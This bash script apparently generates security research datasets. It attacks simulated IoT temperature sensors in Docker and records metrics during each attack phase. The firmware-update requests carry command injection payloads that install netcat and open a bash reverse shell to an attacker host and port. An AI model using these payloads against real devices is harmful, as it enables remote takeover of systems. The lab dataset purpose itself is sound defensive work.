#!/bin/bash

# command_injection_dataset_generator.sh - Generate datasets for command injection attacks

# Default configuration
SENSOR_HOSTS=("localhost" "localhost" "localhost" "localhost")
SENSOR_PORTS=(12381 12382 12383 12384)
ATTACKER_SERVER="172.28.0.3"
ATTACKER_PORT=4444
PROMETHEUS_URL="http://localhost:9090"
OUTPUT_DIR="datasets/command_injection"
BASELINE_DURATION=30     # 30 seconds baseline collection
INSTALL_DURATION=120     # 2 minutes for netcat installation
SHELL_DURATION=180       # 3 minutes for reverse shell session
POST_EVENT_DURATION=60   # 1 minute recovery collection
FAULT_TYPES=("none" "stuck" "drift" "spike" "dropout")

# Determine if we can run docker without sudo
if groups | grep -q '\bdocker\b'; then
    # User is in docker group, no need for sudo
    DOCKER_CMD="sudo docker"
else
    # User is not in docker group, try sudo
    DOCKER_CMD="sudo docker"
fi

# Verify docker permissions
echo "Testing Docker command access..."
$DOCKER_CMD ps >/dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "WARNING: Cannot run Docker commands without password prompt."
    echo "Options to fix this:"
    echo "1. Add your user to the docker group (recommended):"
    echo "   sudo usermod -aG docker $(whoami)"
    echo "   Then log out and log back in, or run 'newgrp docker'"
    echo ""
    echo "2. Configure sudoers for passwordless docker:"
    echo "   echo '$(whoami) ALL=(ALL) NOPASSWD: /usr/bin/docker' | sudo tee /etc/sudoers.d/$(whoami)-docker"
    echo "   sudo chmod 440 /etc/sudoers.d/$(whoami)-docker"
    echo ""
    echo "Continuing with script, but you may be prompted for passwords..."
else
    echo "Docker command access confirmed: $DOCKER_CMD"
fi

# Command line arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --sensors)
      IFS=',' read -ra SENSOR_HOSTS <<< "$2"
      shift 2
      ;;
    --ports)
      IFS=',' read -ra SENSOR_PORTS <<< "$2"
      shift 2
      ;;
    --attacker)
      ATTACKER_SERVER="$2"
      shift 2
      ;;
    --attacker-port)
      ATTACKER_PORT="$2"
      shift 2
      ;;
    --prometheus)
      PROMETHEUS_URL="$2"
      shift 2
      ;;
    --output)
      OUTPUT_DIR="$2"
      shift 2
      ;;
    --baseline)
      BASELINE_DURATION="$2"
      shift 2
      ;;
    --install)
      INSTALL_DURATION="$2"
      shift 2
      ;;
    --shell)
      SHELL_DURATION="$2"
      shift 2
      ;;
    --post)
      POST_EVENT_DURATION="$2"
      shift 2
      ;;
    --help)
      echo "Usage: $0 [options]"
      echo "Options:"
      echo "  --sensors HOSTS      Comma-separated list of sensor hosts (default: localhost,localhost,localhost,localhost)"
      echo "  --ports PORTS        Comma-separated list of sensor ports (default: 12381,12382,12383,12384)"
      echo "  --attacker HOST      Attacker server hostname (default: attacker-server)"
      echo "  --attacker-port PORT Attacker server port for reverse shell (default: 4444)"
      echo "  --prometheus URL     Prometheus URL (default: http://localhost:9090)"
      echo "  --output DIR         Output directory (default: datasets/command_injection)"
      echo "  --baseline SEC       Baseline duration in seconds (default: 30)"
      echo "  --install SEC        Netcat installation duration in seconds (default: 120)"
      echo "  --shell SEC          Reverse shell duration in seconds (default: 180)"
      echo "  --post SEC           Post-event duration in seconds (default: 60)"
      exit 0
      ;;
    *)
      echo "Unknown option: $1"
      exit 1
      ;;
  esac
done

# Verify sensor hosts and ports have the same length
if [ ${#SENSOR_HOSTS[@]} -ne ${#SENSOR_PORTS[@]} ]; then
    echo "ERROR: Number of sensor hosts (${#SENSOR_HOSTS[@]}) must match number of sensor ports (${#SENSOR_PORTS[@]})"
    exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"
echo "Datasets will be saved to: $OUTPUT_DIR"

# Create a master metadata file
MASTER_META_FILE="$OUTPUT_DIR/command_injection_dataset_master_$(date +%Y%m%d_%H%M%S).json"
echo "{" > "$MASTER_META_FILE"
echo "  \"dataset_type\": \"command_injection_analysis\"," >> "$MASTER_META_FILE"
echo "  \"created_at\": \"$(date -Iseconds)\"," >> "$MASTER_META_FILE"
echo "  \"attacker_server\": \"$ATTACKER_SERVER\"," >> "$MASTER_META_FILE"
echo "  \"attacker_port\": \"$ATTACKER_PORT\"," >> "$MASTER_META_FILE"
echo "  \"fault_scenarios\": {" >> "$MASTER_META_FILE"

# Utility function to set sensor fault mode
set_fault_mode() {
    local sensor_host=$1
    local sensor_port=$2
    local fault_type=$3
    
    echo "Setting fault mode to: $fault_type on $sensor_host:$sensor_port"
    
    # Determine payload based on fault type
    if [ "$fault_type" == "none" ]; then
        payload='{"fault_mode": "none"}'
    elif [ "$fault_type" == "stuck" ]; then
        payload='{"fault_mode": "stuck"}'
    elif [ "$fault_type" == "drift" ]; then
        payload='{"fault_mode": "drift"}'
    elif [ "$fault_type" == "spike" ]; then
        payload='{"fault_mode": "spike"}'
    elif [ "$fault_type" == "dropout" ]; then
        payload='{"fault_mode": "dropout"}'
    else
        echo "Unknown fault type: $fault_type"
        return 1
    fi
    
    # Send request to set fault mode for this sensor
    response=$(curl -s -X POST \
      "http://$sensor_host:$sensor_port/simulate/fault" \
      -H 'Content-Type: application/json' \
      -H 'accept: application/json' \
      -u admin:admin \
      -d "$payload")
    
    echo "Fault mode set response: $response"
    
    return 0
}

# Execute command injection to install netcat
install_netcat() {
    local sensor_host=$1
    local sensor_port=$2
    
    echo "Installing networking tools on sensor $sensor_host:$sensor_port..."
    
    # Send command injection payload to install netcat
    response=$(curl -s -X POST -u admin:admin \
      -H "Content-Type: application/json" \
      -d "{\"firmware_url\":\"http://$ATTACKER_SERVER:63999/dummy.sh\", \"version\":\"1.2.3\", \"params\":\"; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc\"}" \
      "http://$sensor_host:$sensor_port/firmware/update")
    
    echo "Netcat installation response: $response"
    
    # Check if the command was successful or if netcat was already installed
    if echo "$response" | grep -q "successfully" || echo "$response" | grep -q "exit status 137"; then
        echo "Netcat installation completed (or was already installed)"
        return 0
    else
        echo "Netcat installation failed: $response"
        return 1
    fi
}

# Execute command injection to establish reverse shell
establish_reverse_shell() {
    local sensor_host=$1
    local sensor_port=$2
    
    echo "Establishing reverse shell from sensor $sensor_host:$sensor_port to $ATTACKER_SERVER:$ATTACKER_PORT..."
    
    # Send command injection payload to establish reverse shell
    response=$(curl -s -X POST -u admin:admin \
      -H "Content-Type: application/json" \
      -d "{\"firmware_url\":\"http://$ATTACKER_SERVER:63999/dummy.sh\", \"version\":\"1.2.3\", \"params\":\"; bash -c \\\"bash -i >& /dev/tcp/$ATTACKER_SERVER/$ATTACKER_PORT 0>&1\\\" > /tmp/reverse.log 2>&1 &\"}" \
      "http://$sensor_host:$sensor_port/firmware/update")
    
    echo "Reverse shell initiation response: $response"
    
    # Check if the command was successful
    if echo "$response" | grep -q "successfully"; then
        echo "Reverse shell initiated successfully"
        return 0
    else
        echo "Reverse shell initiation failed: $response"
        return 1
    fi
}

# Process each fault type
FIRST_SCENARIO=true
for fault_type in "${FAULT_TYPES[@]}"; do
    echo "====================================================="
    echo "Processing command injection under fault condition: $fault_type"
    echo "====================================================="
    
    # Restart the temperature sensor container to ensure clean state
    echo "Restarting temperature-sensor-04 container to ensure a clean state..."
    $DOCKER_CMD restart temperature-sensor-04
    echo "Waiting for container to fully initialize..."
    sleep 20  # Give the container time to restart and initialize
    
    # Create a subdirectory for this fault scenario
    SCENARIO_DIR="$OUTPUT_DIR/${fault_type}"
    mkdir -p "$SCENARIO_DIR"
    
    # Comma handling for JSON
    if [ "$FIRST_SCENARIO" = false ]; then
        echo "  ," >> "$MASTER_META_FILE"
    else
        FIRST_SCENARIO=false
    fi
    
    # Start JSON entry for this fault scenario
    echo "    \"${fault_type}\": {" >> "$MASTER_META_FILE"
    
    # Select a sensor to attack (use the first one for simplicity)
    SENSOR_HOST="${SENSOR_HOSTS[0]}"
    SENSOR_PORT="${SENSOR_PORTS[0]}"
    
    # Reset to normal mode first
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "none"
    sleep 5
    
    # Set the fault mode
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "$fault_type"
    
    # Collect baseline data
    echo "Collecting baseline data before command injection..."
    python3 data_collector.py \
        --event "command_injection_${fault_type}_baseline" \
        --duration "$BASELINE_DURATION" \
        --interval 2 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$SCENARIO_DIR"
    
    BASELINE_FILE=$(ls -t "$SCENARIO_DIR"/command_injection_${fault_type}_baseline_*.jsonl | head -1)
    echo "Baseline data collected: $BASELINE_FILE"
    
    # Add baseline file to metadata
    echo "      \"baseline_file\": \"$BASELINE_FILE\"," >> "$MASTER_META_FILE"
    
    # Start data collection for the netcat installation phase
    echo "Starting data collection for netcat installation phase..."
    python3 data_collector.py \
        --event "command_injection_${fault_type}_install" \
        --duration "$INSTALL_DURATION" \
        --interval 2 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$SCENARIO_DIR" &
    
    COLLECTOR_PID=$!
    echo "Data collector running with PID $COLLECTOR_PID"
    
    # Wait briefly to ensure data collector has started
    sleep 5
    
    # Execute netcat installation
    install_netcat "$SENSOR_HOST" "$SENSOR_PORT"
    
    # Wait for data collection to complete
    echo "Waiting for netcat installation data collection to complete..."
    wait $COLLECTOR_PID
    
    INSTALL_FILE=$(ls -t "$SCENARIO_DIR"/command_injection_${fault_type}_install_*.jsonl | head -1)
    echo "Netcat installation data collected: $INSTALL_FILE"
    
    # Add installation file to metadata
    echo "      \"install_file\": \"$INSTALL_FILE\"," >> "$MASTER_META_FILE"
    
    # Start data collection for the reverse shell phase
    echo "Starting data collection for reverse shell phase..."
    python3 data_collector.py \
        --event "command_injection_${fault_type}_shell" \
        --duration "$SHELL_DURATION" \
        --interval 2 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$SCENARIO_DIR" &
    
    COLLECTOR_PID=$!
    echo "Data collector running with PID $COLLECTOR_PID"
    
    # Wait briefly to ensure data collector has started
    sleep 5
    
    # Execute reverse shell establishment
    establish_reverse_shell "$SENSOR_HOST" "$SENSOR_PORT"
    
    # Wait for data collection to complete
    echo "Waiting for reverse shell data collection to complete..."
    wait $COLLECTOR_PID
    
    SHELL_FILE=$(ls -t "$SCENARIO_DIR"/command_injection_${fault_type}_shell_*.jsonl | head -1)
    echo "Reverse shell data collected: $SHELL_FILE"
    
    # Add shell file to metadata
    echo "      \"shell_file\": \"$SHELL_FILE\"," >> "$MASTER_META_FILE"
    
    # Collect post-event recovery data
    echo "Collecting post-event recovery data..."
    python3 data_collector.py \
        --event "command_injection_${fault_type}_recovery" \
        --duration "$POST_EVENT_DURATION" \
        --interval 2 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$SCENARIO_DIR"
    
    RECOVERY_FILE=$(ls -t "$SCENARIO_DIR"/command_injection_${fault_type}_recovery_*.jsonl | head -1)
    echo "Recovery data collected: $RECOVERY_FILE"
    
    # Add recovery file to metadata
    echo "      \"recovery_file\": \"$RECOVERY_FILE\"" >> "$MASTER_META_FILE"
    echo "    }" >> "$MASTER_META_FILE"
    
    # Reset to normal mode
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "none"
    
    # Sleep between scenarios to ensure system stabilizes
    echo "Cooling down for 60 seconds..."
    sleep 60
done

# Close the master metadata file
echo "  }" >> "$MASTER_META_FILE"
echo "}" >> "$MASTER_META_FILE"

echo "====================================================="
echo "Command injection dataset collection complete!"
echo "====================================================="
echo "Master metadata file: $MASTER_META_FILE"
echo ""
echo "To process this data into CSV format, run:"
echo "python3 command_injection_processor_refactored.py --metadata $MASTER_META_FILE"